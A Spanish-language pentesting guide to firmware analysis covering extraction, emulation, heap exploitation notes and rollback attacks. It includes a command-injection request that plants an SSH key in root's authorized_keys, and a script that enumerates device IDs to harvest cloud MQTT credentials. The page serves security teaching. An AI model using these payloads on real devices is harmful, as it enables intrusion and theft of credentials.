# Análisis de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introducción**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente al gestionar y facilitar la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, dando lugar al arranque del sistema operativo. Examinar y, potencialmente, modificar el firmware es un paso crítico para identificar vulnerabilidades de seguridad.

## **Recopilación de información**

**Recopilación de información** es un paso inicial crítico para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Detalles del bootloader
- Disposición del hardware y datasheets
- Métricas del codebase y ubicaciones del código fuente
- Bibliotecas externas y tipos de licencia
- Historiales de actualización y certificaciones regulatorias
- Diagramas arquitectónicos y de flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de **open-source intelligence (OSINT)** son invaluables, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manual y automatizada. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede aprovecharse para encontrar posibles problemas.

## **Adquisición del Firmware**

Obtener firmware puede abordarse de varias maneras, cada una con su propio nivel de complejidad:

- **Directamente** de la fuente (desarrolladores, fabricantes)
- **Compilándolo** a partir de las instrucciones proporcionadas
- **Descargándolo** de sitios oficiales de soporte
- Utilizando consultas **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **cloud storage**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** mediante técnicas man-in-the-middle
- **Extrayéndolo** del dispositivo a través de conexiones como **UART**, **JTAG** o **PICit**
- **Sniffing** de solicitudes de update dentro de la comunicación del dispositivo
- Identificando y usando **hardcoded update endpoints**
- **Dumping** desde el bootloader o la red
- **Quitando y leyendo** el chip de almacenamiento, cuando todo lo demás falla, usando las herramientas de hardware apropiadas

### UART-only logs: force a root shell via U-Boot env in flash

Si se ignora UART RX (solo logs), aún puedes forzar una init shell editando **offline** el blob del entorno de U-Boot:

1. Haz dump de la SPI flash con un clip SOIC-8 + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localiza la partición del env de U-Boot, edita `bootargs` para incluir `init=/bin/sh`, y **recalcula el CRC32 del env de U-Boot** para el blob.
3. Vuelve a flashear solo la partición env y reinicia; debería aparecer una shell en UART.

Esto es útil en embedded devices donde el shell del bootloader está deshabilitado pero la partición env es escribible mediante acceso externo a la flash.

## Analizando el firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Diferentes herramientas que puedes usar para eso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si no encuentras mucho con esas herramientas, revisa la **entropy** de la imagen con `binwalk -E <bin>`; si es baja, entonces no es probable que esté encrypted. Si es alta, probablemente esté encrypted (o compressed de alguna manera).

Además, puedes usar estas herramientas para extraer **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el file.

### Getting the Filesystem

Con las herramientas comentadas anteriormente como `binwalk -ev <bin>`, deberías haber podido **extraer el filesystem**.\
Binwalk normalmente lo extrae dentro de una **folder named as the filesystem type**, que suele ser una de las siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

A veces, binwalk **no tendrá el magic byte del filesystem en sus signatures**. En estos casos, usa binwalk para **find the offset of the filesystem** y carve the compressed filesystem desde el binary y **manual extract** el filesystem según su tipo usando los pasos de abajo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Ejecuta el siguiente **dd command** extrayendo el sistema de archivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán en el directorio "`squashfs-root`" después.

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizando Firmware

Una vez obtenido el firmware, es esencial diseccionarlo para entender su estructura y posibles vulnerabilidades. Este proceso implica utilizar varias herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de la partición y del filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para evaluar el estado de cifrado de la imagen, se comprueba la **entropy** con `binwalk -E <bin>`. Una entropy baja sugiere ausencia de cifrado, mientras que una entropy alta indica posible cifrado o compresión.

Para extraer **embedded files**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para la inspección de archivos.

### Extrayendo el Filesystem

Usando `binwalk -ev <bin>`, normalmente se puede extraer el filesystem, a menudo en un directorio nombrado según el tipo de filesystem (por ejemplo, squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de filesystem debido a la ausencia de magic bytes, es necesaria la extracción manual. Esto implica usar `binwalk` para localizar el offset del filesystem, seguido del comando `dd` para extraer el filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Después, dependiendo del tipo de filesystem (p. ej., squashfs, cpio, jffs2, ubifs), se usan diferentes comandos para extraer manualmente el contenido.

### Filesystem Analysis

Con el filesystem extraído, comienza la búsqueda de fallos de seguridad. Se presta atención a network daemons inseguros, credenciales hardcoded, API endpoints, funcionalidades del update server, código sin compilar, startup scripts y compiled binaries para análisis offline.

**Key locations** e **items** para inspeccionar incluyen:

- **etc/shadow** y **etc/passwd** para credenciales de usuario
- certificados y claves SSL en **etc/ssl**
- archivos de configuración y scripts para posibles vulnerabilidades
- binaries embebidos para análisis adicional
- web servers y binaries comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para búsqueda de información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análisis integral de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Security Checks on Compiled Binaries

Tanto el código fuente como los compiled binaries encontrados en el filesystem deben ser examinados en busca de vulnerabilidades. Herramientas como **checksec.sh** para Unix binaries y **PESecurity** para Windows binaries ayudan a identificar binaries sin protección que podrían ser explotados.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Muchos IoT hubs obtienen su configuración por dispositivo desde un cloud endpoint que tiene este aspecto:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el firmware analysis puedes encontrar que `<token>` se deriva localmente del device ID usando un hardcoded secret, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y representado como uppercase hex

Este diseño permite que cualquiera que conozca un deviceId y la STATIC_KEY reconstruya la URL y obtenga la cloud config, revelando a menudo credenciales MQTT en plaintext y topic prefixes.

Practical workflow:

1) Extraer deviceId de UART boot logs

- Conecta un adaptador UART de 3.3V (TX/RX/GND) y captura los logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Busca líneas que impriman el patrón de la URL de cloud config y la dirección del broker, por ejemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Recopila la configuración cloud y las credenciales MQTT

- Compón la URL y extrae JSON con curl; analiza con jq para extraer secretos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de MQTT en texto plano y de ACLs de topic débiles (si están presentes)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivo predecibles (a escala, con autorización)

- Muchos ecosistemas incrustan bytes OUI/producto/tipo del vendor seguidos de un sufijo secuencial.
- Puedes iterar IDs candidatos, derivar tokens y obtener configs programáticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Obtén siempre autorización explícita antes de intentar enumeración masiva.
- Prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo cuando sea posible.


El proceso de emular firmware permite **dynamic analysis** ya sea del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede encontrar desafíos con dependencias de hardware o arquitectura, pero transferir el root filesystem o binarios específicos a un dispositivo con arquitectura y endianidad coincidentes, como un Raspberry Pi, o a una máquina virtual preconstruida, puede facilitar pruebas adicionales.

### Emulating Individual Binaries

Para examinar programas individuales, identificar la endianidad y la arquitectura de CPU del programa es crucial.

#### Example with MIPS Architecture

Para emular un binario de arquitectura MIPS, se puede usar el comando:
```bash
file ./squashfs-root/bin/busybox
```
Y para instalar las herramientas de emulación necesarias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), se usa `qemu-mips`, y para binarios little-endian, `qemu-mipsel` sería la opción.

#### ARM Architecture Emulation

Para binarios ARM, el proceso es similar, utilizando el emulador `qemu-arm` para la emulación.

### Full System Emulation

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), y otras, facilitan la emulación completa de firmware, automatizando el proceso y ayudando en el análisis dinámico.

## Dynamic Analysis in Practice

En esta etapa, se usa para el análisis un entorno de dispositivo real o emulado. Es esencial mantener acceso shell al OS y al filesystem. La emulación puede no reproducir perfectamente las interacciones de hardware, lo que requiere reinicios ocasionales de la emulación. El análisis debe volver a revisar el filesystem, explotar páginas web expuestas y servicios de red, y explorar vulnerabilidades del bootloader. Las pruebas de integridad del firmware son críticas para identificar posibles vulnerabilidades de backdoor.

## Runtime Analysis Techniques

El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para targets embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctalo remotamente:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

En hubs IoT, el RF stack suele estar dividido entre un **radio MCU** y un proceso de userland en Linux. Un flujo útil es mapear la ruta:

1. **RF frame** por el aire
2. **controller-side parser** en el radio MCU
3. **serial/UART text o TLV protocol** reenviado a Linux (por ejemplo `/dev/tty*`)
4. **application dispatcher** en el daemon principal
5. **protocol-specific handler / state machine**

Esta arquitectura crea dos objetivos de reversing en lugar de uno. Si el controller convierte frames binarios de radio en un protocolo textual como `Group,Command,arg1,arg2,...`, recupera:

- Los **message groups** y las dispatch tables
- Qué mensajes pueden venir de la **network** frente al propio controller
- Los campos discriminadores exactos **manufacturer-specific** (por ejemplo Zigbee `manufacturer_code` y `cluster_command` personalizado)
- Qué handlers solo son alcanzables durante fases de **commissioning**, discovery o firmware/model download

Para Zigbee específicamente, captura el tráfico de pairing y comprueba si el target sigue dependiendo del **Link Key** por defecto `ZigBeeAlliance09`. Si es así, sniffing del tráfico de commissioning puede exponer la **Network Key**. Zigbee 3.0 install codes reducen esta exposición, así que anota si el dispositivo probado realmente las aplica.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Los comandos Zigbee/ZCL vendor-specific suelen ser un mejor objetivo que los clusters estandarizados porque alimentan **custom parsing code** y **FSMs** internas con validación menos probada.

Flujo práctico:

- Reverse del command dispatcher hasta encontrar el **vendor-only handler**.
- Recupera las tablas de **FSM state**, **event**, **check**, **action** y **next-state**.
- Identifica **transitional states** que avanzan automáticamente y ramas de retry/error que eventualmente reinician o liberan estado controlado por el atacante.
- Confirma qué intercambios legítimos de protocolo se requieren para poner el daemon en el estado vulnerable en lugar de asumir que el handler defectuoso es siempre alcanzable.

Para protocolos sensibles al timing, el replay de paquetes desde un Python framework puede ser demasiado lento. Un enfoque más fiable es emular un dispositivo legítimo en hardware real (por ejemplo un **nRF52840**) con un vendor-grade stack para poder exponer los **endpoints**, **attributes** y el timing de commissioning correctos.

### Fragmented-download bug class in embedded daemons

Una clase recurrente de bugs de firmware aparece en **fragmented blob/model/configuration downloads**:

1. El **primer fragment** (`offset == 0`) guarda `ctx->total_size` y reserva `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos **packet-local** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar contra el **original allocated size**.

Esto permite a un atacante enviar:

- Un primer fragmento válido con un `total size` declarado **pequeño** para forzar una asignación heap pequeña.
- Un fragmento posterior con el **expected offset** pero un `chunk_len` mayor.
- Un tamaño packet-local falseado que satisfaga las comprobaciones nuevas mientras sigue desbordando el buffer originalmente asignado.

Cuando la ruta vulnerable está detrás de lógica de commissioning, la explotación debe incluir suficiente **device emulation** para llevar el target al estado esperado de model-download o blob-download antes de enviar los fragmentos malformados.

### Protocol-driven `free()` triggers

En daemons embebidos, la forma más fácil de disparar explotación de heap metadata a menudo no es "esperar a cleanup" sino **forzar el error handling del propio protocolo**:

- Envía fragmentos de seguimiento malformados para empujar la FSM a estados de **retry** o **error**.
- Supera el umbral de reintentos para que el daemon **resets context** y libere el buffer corrupto.
- Usa este `free()` predecible para disparar primitives del allocator antes de que el proceso crashee por razones no relacionadas.

Esto es especialmente útil contra allocators tipo **musl/uClibc/dlmalloc-like** en embedded Linux, donde corromper chunk metadata puede convertir la lógica unlink/unbin en una write primitive. Un patrón estable es corromper un **size field** para redirigir el recorrido del allocator hacia **fake chunks staged inside the overflowed buffer**, en lugar de sobrescribir inmediatamente punteros reales de bins y crashear el proceso.

## Binary Exploitation and Proof-of-Concept

Desarrollar un PoC para vulnerabilidades identificadas requiere una comprensión profunda de la arquitectura target y programación en lenguajes de bajo nivel. Las protecciones de runtime binarias en sistemas embebidos son raras, pero cuando existen, técnicas como Return Oriented Programming (ROP) pueden ser necesarias.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins similares a glibc. Una posterior asignación grande puede disparar `__malloc_consolidate()`, así que cualquier fake chunk debe superar las comprobaciones (tamaño razonable, `fd = 0`, y chunks circundantes vistos como "in use").
- **Non-PIE binaries under ASLR:** si ASLR está habilitado pero el binary principal es **non-PIE**, las direcciones `.data/.bss` dentro del binary son estables. Puedes apuntar a una región que ya se parezca a un heap chunk header válido para aterrizar una fastbin allocation sobre una **function pointer table**.
- **Parser-stopping NUL:** cuando se parsea JSON, un `\x00` en el payload puede detener el parsing mientras conserva bytes finales controlados por el atacante para un stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** una ROP chain que llame a `open("/proc/self/mem")`, `lseek()` y `write()` puede plantar shellcode ejecutable en un mapping conocido y saltar a él.

## Prepared Operating Systems for Firmware Analysis

Operating systems como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para firmware security testing, con las herramientas necesarias.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro pensada para ayudarte a realizar security assessment y pentesting de dispositivos Internet of Things (IoT). Te ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo de embedded security testing basado en Ubuntu 18.04 con herramientas de firmware security testing precargadas.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Incluso cuando un vendor implementa comprobaciones de firma criptográfica para imágenes de firmware, la **protección contra version rollback (downgrade)** con frecuencia se omite. Cuando el boot- o recovery-loader solo verifica la firma con una public key embebida pero no compara la *version* (o un contador monótono) de la imagen que se va a flashear, un atacante puede instalar legítimamente un **older, vulnerable firmware que aún tenga una firma válida** y así reintroducir vulnerabilidades parcheadas.

Flujo típico de ataque:

1. **Obtain an older signed image**
* Consíguela desde el portal público de descargas del vendor, CDN o site de soporte.
* Extráela de companion mobile/desktop applications (p. ej. dentro de un Android APK en `assets/firmware/`).
* Recupérala de repositorios de terceros como VirusTotal, archivos de Internet, forums, etc.
2. **Upload or serve the image to the device** mediante cualquier canal de actualización expuesto:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *unauthenticated* que aceptan firmware blobs codificados en Base64, los decodifican del lado del servidor y activan recovery/upgrade.
3. Tras el downgrade, explota una vulnerabilidad que fue parcheada en la versión más nueva (por ejemplo un filtro de command-injection que se añadió después).
4. Opcionalmente vuelve a flashear la última imagen o deshabilita actualizaciones para evitar detección una vez se consiga persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando shell sin sanitización, lo que permite la inyección de comandos arbitrarios (aquí – habilitando acceso root por SSH basado en clave). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea inútil.

### Extracting Firmware From Mobile Apps

Muchos vendors empaquetan imágenes completas de firmware dentro de sus companion mobile applications para que la app pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes se almacenan comúnmente sin cifrar en el APK/APEX bajo rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra`, o incluso `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass de anti-rollback solo en updater en diseños de slots A/B

Algunos vendors sí implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recovery, o un agente OTA en userspace). Si más tarde el **bootloader** solo comprueba la firma/CRC de la imagen y confía en la partition table o en los metadatos del slot, la protección contra rollback aún puede ser bypassed.

Diseño débil típico:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **security ratchet** / contador monótono.
- El updater compara el ratchet de la imagen con un valor almacenado en persistent storage y rechaza imágenes firmadas más antiguas.
- El bootloader no parsea ese ratchet y solo verifica header, CRC y signature antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una partition table o en un contador de generación por slot y **no está vinculada criptográficamente** al exacto firmware digest que fue validado.

Esto crea un primitivo de **validate-one-image / boot-another-image** en sistemas de doble slot. Si el attacker puede hacer que el updater marque el slot B como el siguiente target de arranque usando una imagen firmada actual, y luego puede sobrescribir el slot B antes del reboot, el bootloader puede seguir arrancando la imagen downgraded porque solo confía en los metadatos del slot ya committed.

Patrón de abuso típico:

1. Sube un firmware **current signed** al slot pasivo y ejecuta la rutina normal de validación/switch para que el layout marque ese slot como el siguiente activo.
2. **No reinicies todavía**. Vuelve a entrar en la rutina de preparación/erase del slot en la misma sesión.
3. Abusa de un boot-state stale o de una lógica de selección de slot stale para que el updater borre el **mismo slot físico** que acababa de ser promovido.
4. Escribe un firmware **más antiguo pero todavía signed** en ese slot.
5. Omite la rutina de validación que impone el ratchet y reinicia directamente.
6. El bootloader selecciona el slot promovido, verifica solo signature/integrity y arranca la imagen antigua.

Cosas a buscar al reversear implementaciones de update A/B:

- Selección de slot derivada de **boot-time flags** que no se refrescan después de un switch exitoso.
- Una rutina tipo `prepare_passive_slot()` que borra un slot basándose en estado stale en vez del **current committed layout**.
- Una función tipo `part_write_layout()` que solo incrementa un **generation counter** / active flag y no guarda el validated image hash.
- Checks de ratchet implementados en userspace o en código del updater, pero **no** en ROM / bootloader / secure boot stages.
- Rutinas de erase o recovery que dejan el slot marcado como bootable incluso después de que su contenido fue eliminado y reescrito.

### Checklist para evaluar la lógica de update

* ¿El transport/authentication del *update endpoint* está adecuadamente protegido (TLS + authentication)?
* ¿El dispositivo compara **version numbers** o un **monotonic anti-rollback counter** antes de flashear?
* ¿La imagen se verifica dentro de una secure boot chain (por ejemplo, signatures verificadas por código ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en vez de comprobar solo signature/CRC?
* ¿Los metadatos de activación del slot están **vinculados al validated firmware digest/version**, o puede modificarse un slot después de su promoción?
* Después de que un switch de slot tiene éxito, ¿el dispositivo se ve forzado a reiniciar o siguen siendo alcanzables rutinas posteriores de update/erase en la misma sesión?
* ¿El código de userland realiza checks adicionales de sanity (por ejemplo, allowed partition map, model number)?
* ¿Los flujos de update *partial* o *backup* reutilizan la misma lógica de validación?

> 💡 Si falta cualquiera de los anteriores, la plataforma probablemente es vulnerable a rollback attacks.

## Firmware vulnerable para practicar

Para practicar descubriendo vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
